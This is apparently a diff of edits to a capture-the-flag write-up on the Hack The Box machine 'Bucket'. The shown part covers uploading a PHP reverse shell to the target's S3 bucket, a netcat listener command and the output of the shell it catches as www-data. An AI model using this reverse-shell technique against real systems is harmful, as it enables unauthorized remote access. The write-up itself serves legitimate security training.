@@ -72,7 +72,7 @@ Open Ports:
 
 Visiting the website returns a `302 found` status code, redirecting to `bucket.htb`.
 
-So, we add it to the `/etc/hosts` and list again:
+So, we add it to the `/etc/hosts` and we can list it contents:
 
 <br />
 
@@ -187,7 +187,7 @@ Yes! We can upload files!
 
 <br />
 
-At this point, we can try to upload a `malicious` php reverse shell and if the website allows php `execution`, gain access to the victim machine.
+At this point, we can try to upload a `malicious` PHP reverse shell and if the website allows PHP `execution`, we might gain access to the victim machine.
 
 To do it, we can use the `php` reverse shell of [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) GitHub repository:
 
@@ -200,7 +200,7 @@ upload: ./reverseshell.php to s3://adserver/reverseshell.php
 
 <br />
 
-Now we load the `reverse shell` page and check the listener:
+Now we load the `reverse shell` page and check our listener:
 
 <br />
 
@@ -208,7 +208,7 @@ Now we load the `reverse shell` page and check the listener:
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.10.10.212] 33860
-Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+Linux bucket 5.4.0-48-generic 52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  19:06:02 up  1:41,  0 users,  load average: 0.00, 0.01, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
